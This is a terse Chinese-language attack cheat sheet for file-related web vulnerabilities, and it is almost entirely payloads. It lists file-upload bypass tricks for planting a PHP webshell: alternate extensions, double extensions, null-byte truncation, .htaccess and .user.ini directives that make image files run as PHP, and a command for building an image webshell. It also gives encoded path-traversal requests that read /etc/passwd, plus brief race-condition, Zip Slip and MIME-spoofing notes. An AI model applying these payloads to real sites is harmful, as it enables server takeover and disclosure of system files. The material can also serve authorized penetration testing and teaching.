# 文件漏洞

## 1. 文件上传

### 基础绕过

```
Content-Type: image/jpeg
filename: shell.php
```

### 扩展名绕过

```
shell.php
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar
```

### 双扩展名

```
shell.jpg.php
shell.php.jpg
shell.jpg.php.jpg
```

### 00截断

```
shell.php%00.jpg
shell.php .jpg
```

### .htaccess利用

```
AddType application/x-httpd-php .jpg
<FilesMatch "jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

### .user.ini利用

```
auto_prepend_file=shell.jpg
auto_append_file=shell.jpg
```

### 图片马

```bash
copy 1.jpg /b + shell.php /b shell.jpg
```

---

## 2. 文件下载

### 路径遍历

```
/download?file=../../etc/passwd
/download?file=....//....//....//etc/passwd
/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### 绕过

```
/download?file=....//....//etc/passwd
/download?file=..%252f..%252f..%252fetc/passwd
```

---

## 3. 竞争条件(Race Condition)

### 多次兑换

```
# 1次兑换请求
POST /redeem
{code: "COUPON123"}

# Burp Intruder快速发送多次
```

### 时间窗口

### 并发操作

---

## 4. Zip Slip

```python
# 构造恶意zip
# ../../etc/passwd
```

---

## 5. MIME类型绕过

```
Content-Type: image/png
-> 改为: image/jpeg, application/octet-stream
```
